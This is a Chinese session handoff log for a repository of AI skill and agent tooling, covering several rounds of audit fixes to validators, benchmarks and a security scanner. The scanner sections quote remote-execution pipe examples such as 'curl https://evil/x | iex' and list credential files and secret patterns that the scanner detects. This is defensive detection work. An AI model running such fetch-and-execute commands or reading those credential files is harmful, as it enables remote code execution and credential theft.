# 会话交接（2026-09-10 · 第 16 版）

本文件为最近会话的收尾记录，供后续会话快速接续。仓库权威指引是根 `AGENTS.md`（布局/铁律/命令）与两个工作区各自的 `README.md`；本文件只记录**当前上下文与待办**。

## 仓库状态速览

- git：`main`，origin = `losemymind/Personal-AI-Tools`。历史提交：`6824c79` 仓库结构 → `35ca36d` 双创建器工作区/适配器/CATALOG → `46830ca` evals 键名漂移 → `e20fff1` agent 评审闭环 → `79600a2` 加固验证器/评测链 → `cc0962f` 入库 mcp-builder/ue5 → `d486a26` 修复 metrics.json 契约 → `25f03f5` 补验证器缺口 → `8096810` 清四项内部债（0.9.3）→ `192c905` 打通真机无头 CLI（0.9.4）→ `e819536` 真机评测隔离化 + 独立审计两轮修复（0.9.5-0.9.18，见 §E/§F/§G）→ `dfaf829` 交接状态修正 → `232167c` 五轮副agent循环审计修复（skill-creator 0.9.22 / agent-creator 0.7.4）。**origin/main 已同步；CI 在该提交三 job 全绿（run 34550070079）。**
- 两工作区**同构精简**（无 `build/`、成品无 `AGENTS.md`、`INSTALL.md` 在工作区根、成品 `SKILL.md` 为唯一入口）；发布检查差异只因**成品自校验能力不同**（skill-creator 有 `validate_skills.py --strict`；agent-creator 自包含扫描落在 pytest）。
- 能力库：`skills/` = **5 技能**（development/code-review-skill、development/mcp-builder、game-development/ue5-performance-optimization、git/pr-summarizer、product-design/prd-generator）；`agents/` = 32 代理（academic×5 / code-quality×2 / ue-game-studio×25）。
- 版本：**skill-creator 0.9.22**、**agent-creator 0.7.4**。
- ⚠️ 工作树曾有大量改动，**已按用户确认提交并推送**（提交见本文件顶部 `git log` / 下方历史）：阶段一 skill-creator 0.9.18 → 0.9.22（第五轮 6 项 + 收尾复核 1 项 + **第七轮交叉验证 5 项** + **第八轮定向加严 1 项**，见 §J/§M/§N/§P）；阶段二 agent-creator 0.7.0 → 0.7.4（第一轮 21 项 + 新 `security_scan.py`，见 §K；第二轮独立复核 6 项，见 §L；**第三轮交叉验证 3+2 项**，见 §O；**第四轮定向加严 3 项**，见 §Q）。
- `opencode.json`（仓库根）用 `instructions` 注册三份 `AGENTS.md`；`.opencode/`（安装测试副本）已 gitignore。
- 本机可用模型串：`deepseek/deepseek-v4-flash`、`deepseek-responses/deepseek-v4-flash`（全局 `model` 指向不存在的 `siliconflow/...`，必须用 `--model`/`-m` 显式指定）。
- ✅ 真机评测污染已修复（0.9.7，逐查询隔离工作区）；✅ 全量审计九轮（0.9.8-0.9.16）；✅ **独立审计第三/四轮（0.9.17-0.9.18）共发现并修复 19 项真实缺陷**——**第九轮子代理「成品无可复现缺陷」的结论被推翻**（那九轮只修崩溃/健壮性，漏了数据契约与文档-行为一致性）；**修复后又复核才暴露 2 项高/中（delta 角色解析、`.env` 漏扫）**。✅ **独立审计第五轮（0.9.19）再修 6 项**（见 §J）。✅ **收尾复核（0.9.20）再修 1 项**（见 §M）。✅ **agent-creator 独立审计第一轮（0.7.1）修 21 项**（见 §K）；✅ **第二轮独立复核（0.7.2）再修 6 项**（见 §L）；✅ **最终对抗式交叉验证（本会话）：skill 第七轮（0.9.21）修 5 项、agent 第三轮（0.7.3）修 3+2 项**（见 §N/§O）——**再次推翻「已达标」**：发现孪生不对称（curl/wget 缺 `iex`、skill 缺 `SENSITIVE_DOTFILES`）、续行/引号绕过、隐藏目录凭据盲区、以及 agent 验证器 `SKILL_ROOT` 回退假通过。✅ **定向加严轮（本会话）skill 第八轮（0.9.22）修 1 项、agent 第四轮（0.7.4）修 3 项**（见 §P/§Q）——先运行期复核上轮修复真生效，再攻脚手架 YAML 安全/路径冲突/描述边界。

## 本会话已完成改动

### A. skill-creator 成品演进 0.9.0 → 0.9.1（修复基准评测链 5 处缺陷）

只读审阅 skill-creator 成品后，修复基准评测链的 5 处缺陷（C1 为真实产物契约断裂）：

- **C1 metrics.json 写入/读取路径不一致**（数据丢失）：`run_scenario.py` 写 run 根目录，`agents/grader.md` 却读 `outputs/` 子目录，导致该文件无人消费、`tool_calls` 恒 0。修复：grader 路径改为 `{outputs_dir}/../metrics.json`；`aggregate_benchmark.py` 增确定性回退，直接读 run 根 `metrics.json`。
- **C2 tool 计数脆弱**：`run_scenario.py` 新增 `count_tool_calls()`，改逐行 `json.loads` 按 `type=="tool"` 计数（原空格敏感子串计数）。
- **C3 schema 缺记录**：`references/benchmark-schema.md` 补 `metrics.json` 小节、读取契约与完整工作区布局。
- **C4 run_loop 选优口径**：新增 `_test_rank()`，按 test **通过率**选优、并列回退 passed 计数。
- **C5 run_eval 汇总口径**：`summarize()` 的 `total` 只计已评分查询（`passed+failed==total`），run errors 单列。
- 测试：`tests/test_hardening.py` +5 例（tool 计数 / aggregate 回退 / grader 路径契约 / run_eval 口径 / run_loop 排序）→ skill pytest **41 → 46**。
- 记录：`evolutions/2026-09-10-fix-metrics-contract.md`（新增）。
- `.opencode/skills/skill-creator/` 安装副本已同步 7 个改动文件（逐字节一致）。

### B. skill-creator 成品演进 0.9.1 → 0.9.2（补齐 `validate_skills.py` 三个机械缺口）

- **E1 name 字符集（twin parity）**：验证器补 `NAME_PATTERN`，强制小写 kebab-case（孪生 `validate_agents.py` 早已强制，skill-creator 漏掉）。
- **E2 evals.json 形状**：技能存在 `evals/evals.json` 或根 `evals.json` 时强制形状（可解析、含 `evals` 数组、每项有非空 `query`（legacy `prompt` 可）与布尔 `should_trigger`）；**缺失仅 advisory**（不阻断，能力库 3 个技能尚未随附 evals）。
- **E3 反引号引用白名单**：由 `md|py|sh|json|yaml|yml|ts|js` 扩为含 `db`/`txt`/`xml`/`toml`/`css`/`html`/`rs`/`go` 等，使 `indexes/upstream.db` 类引用纳入校验。
- **minor**：`risk: unknown` 新增 advisory。
- 测试：`tests/test_hardening.py` +6 例 → skill pytest **46 → 52**。
- 记录：`evolutions/2026-09-10-close-validator-gaps.md`（新增）。
- `.opencode/skills/skill-creator/` 镜像已同步 4 个改动文件。
- 未改动：agent-creator、根能力库 `skills/`/`agents/` 内容、两份 `CATALOG.md`（`--check` 仍 up to date）。

### C. skill-creator 成品演进 0.9.2 → 0.9.3（清四项内部债）

1. **references 互链（内容 + 护栏）**：修 `skill-writing-guide.md`/`skill-template.md`/`quality-bar.md` 三处裸兄弟文件名互链；`validate_skills.py` 新增 `check_references_cross_links()`，把「references 不互链」变成机械 error。
2. **连带发现并修复 `utils.classify` 缺陷**：原按 description 中**重复 token 计数**，导致「创建」出现 3 次时任何含「创建」的查询假阳性。改为按去重 token 集合求交。
3. **dogfooding evals**：为 skill-creator 主体现增 `evals.json`（14 条），并为 `code-review-skill`/`pr-summarizer`/`prd-generator` 各补 `evals.json`（各 11 条）→ 成品与 5 个库技能 strict 的「No evals.json」advisory 全部清零。
4. **CI**：新增 `.github/workflows/validate.yml`（3 job：skill-creator pytest+strict、agent-creator pytest+strict、CATALOG `--check`），复刻本地发布门。
5. **债 4（对比评分粒度）暂不修**：维持文档化（改动会破坏 `evolutions/` 历史分值可比性，投入产出比低）。
- 测试：`tests/test_hardening.py` +3（references 互链失败/放行、classify 去重）→ skill pytest **52 → 55**；另新增 4 份 evals.json（非 pytest）。
- 记录：`evolutions/2026-09-10-close-audit-debts.md`（新增）。
- 文档：根 `AGENTS.md` 补 CI 说明；`.opencode/skills/skill-creator/` 镜像同步 8 个文件。
- 未改动：agent-creator 及两名库内容、两份 `CATALOG.md`（`--check` 仍 up to date）。

> 备注：`code-review-skill` 触发评测 10/11，唯一假阳性「总结…PR 改动」源于与 pr-summarizer 共享通用词 `pr`/`改动`，属词重叠启发式固有（同 ue5 先例），已保留记录。

### D. skill-creator 成品演进 0.9.3 → 0.9.4（打通真机无头 CLI）

- **环境根因**：`~/.config/opencode/opencode.json` 顶层 `model` 指向不存在的 `siliconflow/...` → 每次 `opencode run` 报 `UnknownError`。**解法：`opencode run -m <provider>/<model>` 显式指定，无需改全局配置。** 本机可用模型串：`deepseek/deepseek-v4-flash`、`deepseek-responses/deepseek-v4-flash`。
- **真机暴露并修复 4 处评测链缺陷**（合成 stub 发现不了）：
  1. cli 三处（`run_eval`/`run_scenario`/`run_loop`）不支持 `--model` → 默认模型错时全 run_error；已加并透传。
  2. **触发判定假阳性**：原按「技能名出现在整段输出」判定，实测「帮我写单元测试」因 `Get-ChildItem` 列出 `.opencode\skills\skill-creator` 路径被误判为触发；已改为**只认客户端派发技能工具**（opencode `tool_use` 且 `tool=="skill"`、`input.name==技能名`）。
  3. `summarize()` 对 cli 结果 `KeyError: 'triggered'`（cli 用 `trigger_rate`）；已归一化两种形状。
  4. `run_scenario` 工具计数恒 0（真机事件是 `tool_use`）；已兼容。
  5. `run_eval` 新增 `--timeout`。
- **真机证据（部分）**：受控实验确认 skill-creator 被真实触发（事件流出现 `tool:"skill"` / `input.name:"skill-creator"`）；6 条子集实跑出 1 超时 + 2 pass 后，完整重跑因**单条查询耗时长、命令卡死**被用户中止——**完整真机基准仍待**在有充裕时间时补跑。
- 测试：`tests/test_hardening.py` +5 → skill pytest **55 → 61**。
- 记录：`evolutions/2026-09-10-realmachine-cli-unblock.md`。
- 镜像同步 5 文件；docs（SKILL.md 阶段 5/7 用法）已更新。

### E. skill-creator 成品演进 0.9.4 → 0.9.7（真机评测：提速 + 信号保真 + 隔离）

**E1（0.9.5）run_eval 有界并行**：真机 `--mode cli` 原为**串行**，批次 1（7 查询 × 3 次 = 15 次 `opencode run`）耗时 **927.5s**，批次 2 超 10 分钟卡死（单条查询 30–120s）。新增 `--concurrency N`（默认 1=串行、向后兼容；`ThreadPoolExecutor.map` 保序），抽出 `run_cli_item`/`run_cli_batch`。真机提速 **~4.8×**（批次 1：928s → 194s）。+3 测试。

**E2（0.9.6）超时保留已发生的触发信号**：`run_cli` 原在 `TimeoutExpired` 时直接抛错、丢弃部分 stdout，但技能派发（`tool_use`）常发生在耗时任务**之前** → 真实触发被误记 `run_error`、系统性低估 recall。改为超时先解析部分输出（`_partial_text`），已见本技能派发即记触发，无证据才报错。+3 测试。

**E3（0.9.7）一次性隔离工作区**：`run_eval --mode cli` 原在仓库根**就地**运行，触发代理会真的执行技能并改动仓库（实证：追加测试、生成 `.eval-baseline/`/`.tmp-eval/`、派生孤儿进程）。新增 `build_workspace()`（`tempfile.mkdtemp` + 技能装入 `SKILL_SUBPATHS` 发现路径，与 `run_scenario` 一致）与 `run_cli(..., workspace=)`；`main()` 结束即 `rmtree`，`--keep-workspace` 可保留调试。+5 测试。

**真机复跑（0.9.7 隔离版，14 查询 × 3 轮，`deepseek-v4-flash` + opencode，`--concurrency 7 --timeout 120`）**：
- 批次 1：**4/7 过线、recall 0.571、0 run_error**；批次 2：**7/7 全过、recall 100%**（6 条负例全部正确不触发）。
- 汇总：正例 **5/8 过线（recall ≈ 0.625）**、precision **100%**；**git status 零污染、无孤儿进程、临时工作区自动清理**。
- 对比：隔离前就地运行时触发代理会卡在仓库里执行技能（超时/低触发）；隔离后既卫生又显著提升测量质量。

- 测试：`tests/test_hardening.py` +6（0.9.5/0.9.6）再 +5（0.9.7）→ skill pytest **61 → 77**。
- 记录：`evolutions/2026-09-10-realmachine-concurrency.md`、`-timeout-signal.md`、`-isolation.md`。
- 镜像同步 run_eval.py / SKILL.md / README.md / 三份 evolutions。
- 未改动：agent-creator、根能力库内容、两份 `CATALOG.md`（`--check` 仍 up to date）。

### F. skill-creator 全量审计九轮修复 0.9.8 → 0.9.16（用户要求「全部修复 + 子代理续查至无问题」）

对成品全部脚本做只读审计，实证复现并修复 12 项缺陷；随后由 code-reviewer 子代理连续复查 8 轮，逐轮修复其新发现，直至末轮判定**成品在合理用户路径上无可复现的正确性/安全/契约缺陷**。

**第一轮（0.9.8）12 项**：安全 allowlist 全局绕过→局部豁免；compare 缺 SKILL.md 崩溃；aggregate delta 方向靠字典序；run_loop cli 未隔离/JSON 解析；run_eval 并发共享工作区；超时只杀直接子进程→杀进程树；run_scenario 超时不落盘；`assets/` vs `templates/`；compare docstring；脚手架不出 evals.json；cli 客户端范围说明；split 边界 + evals 扩到 20。

**子代理八轮追加（0.9.9→0.9.16）**：
- 围栏检测 CommonMark 化（`~~~`/未闭合/4 反引号不再绕过安全扫描）；
- FTS5 特殊字符查询崩溃 → 逐词字面引用；
- 大批 `aggregate_benchmark`/`run_eval`/`run_loop`/`run_scenario`/`create_skill` 的**畸形输入崩溃**（非字典 JSON/`part`、混合 `eval_id`、非有限值 `Infinity`/`NaN`、非数字字段、路径参数指向文件、父路径是文件等）全部转清晰报错；
- 脚手架 YAML 转义（描述/作者/tools）、描述长度校验、版本校验、交互 EOF；
- compare `--json` 纯 JSON；`--keep-workspace` 打印路径；`build_workspace` 失败清理；密钥扫描扩到全目录（引用扫描仍限 SKILL.md）；
- 基准 delta 无基线时置 `null`+note（不再假增益）、markdown delta 百分比单位。

- 测试：`tests/test_hardening.py` 从 72 → **130 例**（0.9.8 起 +58）；成品/能力库/agent strict 与 CATALOG 全绿。
- 记录：`evolutions/2026-09-10-audit-round2-fixes.md`（含各轮明细）。
- 镜像同步 utils/validate/compare/aggregate/run_eval/run_loop/run_scenario/create_skill/search_index + SKILL/README/references/evals。
- 未改动：agent-creator、根能力库内容、两份 `CATALOG.md`（`--check` 仍 up to date）。

### G. skill-creator 独立审计第三轮 0.9.16 → 0.9.17（14 项真实缺陷）

前九轮只修「崩溃/健壮性」，本轮由主代理 + 两个 code-reviewer 子代理独立复查，逐条复现后修复**数据契约、安全扫描覆盖/绕过、文档-行为一致性**类缺陷：

1. **索引写坏已提交数据（中）**：`build_index.frontmatter_of` 块标量描述存成 `'>'`/`'|-'` 字面量（`indexes/upstream.db` 中 3 条 anthropics 记录实证损坏）→ 改用共享 `utils.parse_frontmatter`（PyYAML/UTF-8-sig）+ 增强 min 解析回退；`--source anthropics --incremental` 重建，损坏清零、总数 2187 不变。
2. **危险管道绕过/误报（中/高）**：续行 `\`+换行、`| sudo -u root bash`、`env bash`、`/bin/bash`、`busybox sh`、4 空格缩进、blockquote 围栏全部漏检；且**只扫 SKILL.md、捆绑脚本不扫** → 重写为「管道链 + 右侧 token 化判定」（不误报 `| grep bash`），覆盖续行/缩进/引号围栏，并把目录级危险管道扫描并入 `check_dir_secrets`。
3. **claude 触发判定与文档矛盾（中）**：`detect_triggered` 走全文子串却声称「不做子串匹配」→ 接受 `type in ("tool_use","tool")`，SKILL.md 明写 claude 为 best-effort 子串。
4. **契约/健壮性（低）**：markdown 链接加 fenced 豁免；`run_loop --holdout nan/inf` 校验；`run_loop` 补评最后一轮改进候选（不再丢轮）；`run_scenario` 命令缺失也落盘；`load_eval_set` 强制 `should_trigger`；`skill_count==0` 报错；`search_index` 拒负 limit；`ask()`/benchmark 文案/timing schema 小修；密钥扫描扩展名补 `.ps1/.bat/.cmd/.env`。
5. **经复核不成立、未改**：扫描源 `category/risk` NULL（上游 frontmatter 确实只有 name/description）、4 反引号闭合 3 反引号围栏（符合 CommonMark）。
- 测试：`tests/test_hardening.py` **130 → 148 例**；索引重建；`.opencode` 镜像全量同步（53 文件哈希一致）。
- 记录：`evolutions/2026-09-10-audit-round3-data-and-coverage.md`。

### H. skill-creator 第四轮复核 0.9.17 → 0.9.18（修复后再查，又 5 项）

对第三轮**修复后**的成品再跑子代理复核，暴露 2 项高/中真实缺陷（证明「修了但没修对」）：

1. **`aggregate_benchmark._ordered_configs` 混合命名下 delta 符号反转（高）**：primary 仅以别名出现、baseline 以精确名出现时，单次遍历把 baseline 放进 primary 位 → 报告 `primary=without_skill`、增益取反。先独立解析角色再排序。
2. **`.env` 密钥漏扫（高，第三轮补的扩展名从未生效）**：`os.path.splitext(".env")==('.env','')`、`.env.local==('.env','.local')` → 裸 dotenv 文件跳过。新增 `_is_scannable_text`。
3. **危险管道三类绕过（中）**：`|` 落行尾换行、tab 缩进代码块（1 tab=4 列）、PowerShell 别名错配（`irm`/`iwr`）与 `pwsh/powershell/cmd` 未覆盖。
4. **`scan_skill_dir` 丢弃 `tags`/`tools`（中）**：透传（映射 `plugin.targets`）。
5. **低**：`command -v bash` 误报；`--no-dl` 根目录差一级；`skill-anatomy.md` 的 `{{#include}}` 伪语法与 TOC 阈值 300/100 不一致。
- 测试：`tests/test_hardening.py` **148 → 153 例**；`.opencode` 镜像同步（54 文件哈希一致）。
- 记录：`evolutions/2026-09-10-audit-round4-recheck.md`。

### I. 交付收尾：推送 + CI 首次验证（本次会话）

- 复核上会话所有改动（0.9.5-0.9.18）实为已提交 `e819536`，HANDOFF 中「未提交」表述过期。
- 本地发布门全绿：agent-creator pytest 18、skill-creator pytest 153、skill-creator 成品 strict + 能力库 5 技能 strict、能力库 32 代理 strict、`build_catalog.py --check`、索引 4 源 2187 条。
- 修正 HANDOFF 过期状态 → 提交 `dfaf829` → 推送 `origin/main`。
- **CI 首次真机运行全绿**：`.github/workflows/validate.yml` 三 job success（run 34480215967）。未改任何成品/能力库内容。

### J. skill-creator 独立审计第五轮 0.9.18 → 0.9.19（本会话，6 项修复 + 1 文档）

对成品全量只读审阅 + 逐条实证复现后修复；重点覆盖前几轮盲区：**「已提交产物的数据契约」与「文档承诺 ≠ 行为」**，兼补安全扫描覆盖缺口。全部改动仅落在 skill-creator 成品与 dev-only 测试。

1. **`aggregate_benchmark` 缺 `pass_rate` 静默记 0%（中，数据契约）**：`grading.json` 由 LLM 评分子代理产出，`summary` 可能只给 `passed/failed/total`。原 `_as_float(summary.get("pass_rate", 0.0))` 把缺失当 0% 并带进 delta。复现 `{passed:2,failed:1,total:3}` → mean 0.0。修复：缺 `pass_rate` 时由 `passed/total` 推导。
2. **`compare_skills` 结构分 `resource_organization` 计数任意子目录（低，文档≠行为）**：文档定义「scripts/references/examples/templates 子目录」，实现却是任意子目录数/3。复现 `foo/bar/baz` → 满分。修复：只计已知资源目录交集/3。
3. **安全扫描按扩展名漏扫捆绑代码（中，覆盖缺口）**：`TEXT_SCAN_EXTS` 缺 `.js/.ts/.tsx/.jsx/.mjs/.cjs/.rb/.go/.java/.rs/.php`，而 `BACKTICK_REF_RE` 认这些——`scripts/deploy.js` 里的密钥/危险管道可绕过。修复：补齐扩展名。
4. **常见凭据格式漏检（中）**：`SECRET_PATTERNS` 漏 `github_pat_`、`ghs_`/`ghr_`、Google `AIza…`、PEM 私钥头 `-----BEGIN … PRIVATE KEY-----`。修复：加入；并确认不误报 benign lookalike。
5. **允许清单无法豁免缩进代码块（低，文档≠行为）**：报错文案承诺「annotate its block/line」即可豁免，但 `security_allowlist_ranges` 只认围栏。修复：marker 紧邻的缩进（≥4 列）代码块同样豁免（围栏优先，避免误豁免被正文隔开的块）。
6. **`build_index.enrich_structure` 路径回退不一致（低，数据契约）**：`extract_fields` 对仅有 `id` 的项回退 `skills/<id>`，`enrich_structure` 未回退 → 结构统计落到仓库根。修复：复用同一回退。
7. **SKILL.md 解剖块 TOC 阈值 `>300` 残留（低，文档不一致）**：第四轮只改了 skill-anatomy，SKILL.md 自身仍写 `>300`。修复为 `>100`。

- 测试：`tests/test_hardening.py` **153 → 159 例**（+6）；`evolutions/2026-09-10-audit-round5.md`（新增）。
- 发布门全绿（见下）；`.opencode/skills/skill-creator` 镜像已同步 7 个文件（哈希一致）。
- **未提交 / 未推送**（遵守铁律 3，等待用户确认）。git：`main` @ `39195da`，工作树 7 处未提交改动（5 脚本 + SKILL.md + tests + 1 新 evolutions）。

**已知未改（低，观察记录）**：`build_index.scan_skill_dir` 对**扫描源**的 `source` 字段硬编码 `"community"`，忽略上游 frontmatter 里声明的 `source`（anthropics 官方源因此被标 community）。影响仅限 `source` 列（无消费者展示），且修复需联网重建 `indexes/upstream.db` 才能同步已提交产物——本轮不改，留待下次线上重建时一并处理。

### K. agent-creator 独立审计第一轮 0.7.0 → 0.7.1（本会话，21 项修复 + 新安全扫描模块）

对 `agent-creator/skills/agent-creator/` 全量只读审阅 + 逐条实证复现，照 skill-creator 同套审计维度修复。**新增自包含模块 `scripts/security_scan.py`**（密钥 + 危险远程执行管道 + 局部 allowlist），并接入验证器。

1. **安全扫描缺失（中）**：`validate_agents.py` 从不扫密钥/危险管道 → 新增模块；扫描 AGENT.md **与捆绑资源目录**（`check_dir_security`）。
2. **BOM 数据契约（高）**：`validate_agents` / `compare_agents` / `build_agent_index` 用 `utf-8` 读，BOM 令合法代理被误报缺 frontmatter → 改 `utf-8-sig`。
3. **BOM 令适配器静默透传（高）**：`adapt_agent.py` 遇 BOM 判「无 frontmatter」→ 原样输出 opencode 非法 `tools: [...]` 数组、退出 0 → 改 `utf-8-sig`。
4. **`compare_agents --json` 非纯 JSON（中）** + 缺 AGENT.md `KeyError` + 非 dict frontmatter `AttributeError` → 全部修复。
5. **验证器健壮性（中）**：非字符串 `name`（`name: 123`）`TypeError` → 类型校验；默认 `--dir` 扫自身产品误报 6 错 → 非 `AGENT.md` 需 frontmatter 才计为代理；fenced 链接/反引号误报悬空 → 豁免；扩展名白名单补 `db/txt/...`；显式 `--dir` 空目录静默全绿 → fail-loud。
6. **脚手架（中/低）**：描述含引号/换行产出非法 YAML（docstring 承诺可自校验）→ `json.dumps` 安全标量；`mode` 被描述中 "subagent" 污染 → 精确替换；交互 EOF 回溯 → 兜底；版本不校验 → 前置校验。
7. **检索/索引（中/低）**：FTS5 特殊字符查询回溯 → 逐词字面引用；负 `--limit` 当无限 → 报错；`build_agent_index` 块标量描述被存成 `">"` → 解析续行；`--no-dl` 与 `--keep` 是死参数（help 承诺但不生效）→ 分别落地为扫 cwd 与纳入清理条件；`--from-extracted` 坏路径回溯 → 前置校验。
8. **文档一致性（低）**：真实质量维度为 **7**（含 `security_guardrails`）但 SKILL.md/README/`agent-comparison.md` 写「6 维」且 SKILL.md 列表漏安全护栏 → 统一为 7 维；`agent-anatomy.md` 自相矛盾（提及兄弟 reference 又声明不互链）→ 经 SKILL.md 导读。

- 测试：`agent-creator/tests/test_hardening_round1.py` 新增 **24 例** → agent pytest **18 → 44**；`evolutions/2026-09-10-audit-round1.md`（新增）。
- 发布门全绿（见下）；**agent-creator 无 `.opencode/skills/agent-creator/` 安装测试副本**（仅 skill-creator 有），本轮未同步镜像。
- **未提交 / 未推送**（遵守铁律 3，等待用户确认）。git：`main` @ `39195da`。

**已知未改（低，观察记录）**：`compare_agents.py` 的 `security_guardrails` 现复用 `find_dangerous_pipes`（prose 感知），但 offensive 免责判定仍为简单子串匹配；`adapt_agent.py` codex/deepseek「逐字节透传」在输入带 BOM 时会去掉 BOM（docstring 措辞待下次收敛）；能力库 `agents/` 无捆绑资源，安全扫描对库无影响。

### L. agent-creator 独立审计第二轮复核 0.7.1 → 0.7.2（本会话，6 项修复，含「验证修复是否生效」）

换角度独立复核 0.7.1：先用 grep + 运行期探针把第一轮 21 项**逐项验证是否真的生效**（结论：无「修了但没生效」项；已提交 `indexes/upstream.db` 无块标量损坏、568 条稳定、`--json` 纯 JSON、BOM 全链路 `utf-8-sig` 均成立），随后新发现并修复 6 项：

1. **危险管道 PowerShell 别名绕过（中，安全）**：`curl`/`wget` 在 PowerShell 是 `Invoke-WebRequest` 别名，但管道右侧 shell 名单不含 `iex`/`invoke-expression` → `curl https://evil/x | iex`、`wget … | Invoke-Expression` 漏检（`irm/iwr … | iex` 才检出）。修复：并入 curl/wget 链 shell 集合；`grep iex` 不误报。
2. **凭据 dotfile 漏扫（中，覆盖缺口）**：`is_scannable_text` 仅特判 `.env`，`id_rsa`/`id_ed25519`/`.npmrc`/`.git-credentials`/`.netrc` 等无扩展名凭据文件被跳过。修复：新增 `SENSITIVE_DOTFILES` 精确名单（捆绑 `id_rsa` 的 PEM 头现可检出）。
3. **带标题 Markdown 链接误报悬空（中，正确性）**：`[x](guide.md "标题")` 的标题被当路径一部分 → 文件存在也报 `Dangling link`。修复：解析前剥离 CommonMark 可选标题。
4. **`compare_agents --json` 契约错误（低）**：`meta.comparison_dimensions` 仍为 `quality6+structure4`，与实算 7 维矛盾 → 改 `quality7+structure4`。
5. **`quality-bar` 计数漂移（低，文档≠行为）**：`agent-quality-bar.md`/README 仍称「6 项质量检查」→ 统一为 7 项并补第 7 项安全护栏。
6. **`build_agent_index` CLI/产物保护（低，数据契约）**：`--no-dl` 未强制单源（默认 all 会重复扫同一 cwd）→ 与 `--from-extracted` 一致强制单 `--source`；某源 0 命中时原仍写库（会用部分源覆盖已提交 DB）→ 改 fail-loud 不写库；下载/解包失败改清晰报错。

- 测试：`agent-creator/tests/test_hardening_round2.py` 新增 **9 例** → agent pytest **44 → 53**；`evolutions/2026-09-10-audit-round2.md`（新增）。
- 发布门全绿（见下）；**未提交 / 未推送**（遵守铁律 3）。

### M. skill-creator 收尾确认复核 0.9.19 → 0.9.20（本会话，1 项修复）

轻量确认第五轮 6 项修复生效（`pass_rate` 推导 / 资源目录计数 / 代码扩展名 / 密钥模式与 `.env` / allowlist 缩进豁免 / `build_index` 路径回退）——**均生效、无回归**；复核中另发现 1 项可复现缺陷并修复：

- **带标题 Markdown 链接误报悬空（中，正确性）**：`validate_skills.py` 的 dangling-link 检查把 `[x](guide.md "标题")` 整体当路径 → 文件存在也报 `Dangling link`。修复：剥离可选标题。**同一缺陷在 agent-creator 孪生验证器中亦存在，已同步修复**（见 §L 第 3 项）。
- 测试：`skill-creator/tests/test_hardening.py` +2 例 → skill pytest **159 → 161**；`evolutions/2026-09-10-audit-round6-recheck.md`（新增）。
- `.opencode/skills/skill-creator` 镜像同步 `SKILL.md`/`validate_skills.py`/新 evolutions（哈希一致）。
- **未提交 / 未推送**（遵守铁律 3）。

### N. skill-creator 第七轮对抗式交叉验证 0.9.20 → 0.9.21（本会话，5 项）

对「已达标」结论做最终独立交叉验证：不重走相同清单，主动构造同类变体与换角度攻击面，逐条运行期实证。**成功推翻**并修复 5 项（全部落在前六轮未覆盖的孪生差额/shell 语法等价类/隐藏目录）：

1. **curl/wget 管道缺 `iex`/`invoke-expression`（中，安全，孪生不对称）**：agent 第二轮已修，skill `utils.py` 从未同步 → `curl x | iex` 实证 skill 返回 0、agent 返回 1。修复：并入同一 shell 集合。
2. **PowerShell 反引号 / CMD 脱字符续行绕过（中，安全）**：`curl x ` +换行+ `| iex`、`curl x ^` +换行+ `| cmd` 漏检。修复：`find_dangerous_pipes` 归一化合并续行，**仅当续行后紧跟 `|`**（初版无条件合并误吞围栏首行 ` ``` `、令围栏检测回归，探针立现，已纠正并在 evolutions 记录）。
3. **引号/子壳包裹 shell token 绕过（中，安全）**：`| "bash"`、`| (bash)`、`| $(bash)` 漏检。修复：新增 `_normalize_token` 剥离配对包裹；benign 用例零误报。
4. **无扩展名凭据文件名漏扫（中，覆盖，孪生不对称）**：skill `_is_scannable_text` 无 `SENSITIVE_DOTFILES`。修复：引入同名单表 + 补 `credentials`/`.gitconfig`/rc 文件等。
5. **隐藏目录整体跳过（中，安全，双孪生）**：`.ssh/id_rsa`、`.aws/credentials` 不可见（实证 0 命中）。修复：安全扫描下钻隐藏目录，仅跳过 VCS/缓存（`SECURITY_SKIP_DIRS`）。

- 测试：`skill-creator/tests/test_hardening.py` +5 例 → skill pytest **161 → 166**；`evolutions/2026-09-10-audit-round7.md`（新增）。
- `.opencode/skills/skill-creator` 镜像同步（全量 160 文件哈希一致）。
- 发布门全绿（skill pytest 166、成品+能力库 strict、索引 4 源 2187、CATALOG --check）。
- **未提交 / 未推送**。

### O. agent-creator 第三轮对抗式交叉验证 0.7.2 → 0.7.3（本会话，3+2 项）

与 skill 第七轮同批、换角度对抗复核，修复 5 项（3 项独立 + 2 项为 skill 侧落后于 agent 的差额的对照确认）：

1. **PowerShell 反引号 / CMD 脱字符续行绕过（中，安全）** — 同 §N-2，双侧同步修复。
2. **引号/子壳包裹 shell token 绕过（中，安全）** — 同 §N-3，双侧同步修复。
3. **隐藏目录整体跳过（中，安全）** — 同 §N-5；agent `check_dir_security` 下钻隐藏目录。
4. **无扩展名凭据名补强（中，覆盖）**：`SENSITIVE_DOTFILES` 补 `credentials` 等。
5. **backtick 引用回退 `SKILL_ROOT` 造成假通过（中，验证器 fail-open）**：`validate_agents.py` 本地解析不到时回退 agent-creator 自身根目录；实证 AGENT.md 引用不存在的 `references/agent-anatomy.md` 仍 `--strict` 全绿。修复：移除回退，只按代理自身目录解析（对齐 skill 侧早已移除的同款回退）。

- 测试：新增 `agent-creator/tests/test_hardening_round3.py` **5 例** → agent pytest **53 → 58**；`evolutions/2026-09-10-audit-round3.md`（新增）。
- 发布门全绿（agent pytest 58、库 strict 32、索引 3 源 568、CATALOG --check）；移除回退后库 32 代理仍全绿（无代理依赖该回退）。
- **未提交 / 未推送**。

### P. skill-creator 第八轮定向加严 0.9.21 → 0.9.22（本会话，1 项）

按 HANDOFF 第 9 条「下一步」定向加严：先用**运行期探针**逐项验证第七轮 5 项修复是否真生效（结论：全部生效、无误报回归），再攻脚手架产物合法性。发现并修复 1 项孪生共享缺陷：

- **空白 description 产出「自不合法」产物（低-中，契约/fail-open）**：`create_skill.py --description "   "`（truthy 但 strip 为空）通过校验并写入文件，而 `validate_skills.py` 以「description field is empty or whitespace only」拒绝 → 脚手架产物不过自己的门。修复：写盘前 `if not description.strip(): 拒绝`。**同一缺陷在孪生 `create_agent.py` 亦存在，已同步修复**（见 §Q）。
- 已复核不成立：CJK+FTS 混合查询（含 `"`/`*`/`OR`/`-`/括号/`+`/`:`/不平衡引号/纯空白/`%`/`_`/`\`）全部 rc=0、无崩溃、无语法注入；并取索引中真实中文行验证 CJK 分支检索命中（`驱动的综合健康分析系统` 命中 `ai-analyzer`），**无静默漏结果**。

- 测试：`skill-creator/tests/test_hardening.py` +1 → skill pytest **166 → 167**；`evolutions/2026-09-10-audit-round8.md`（新增）。
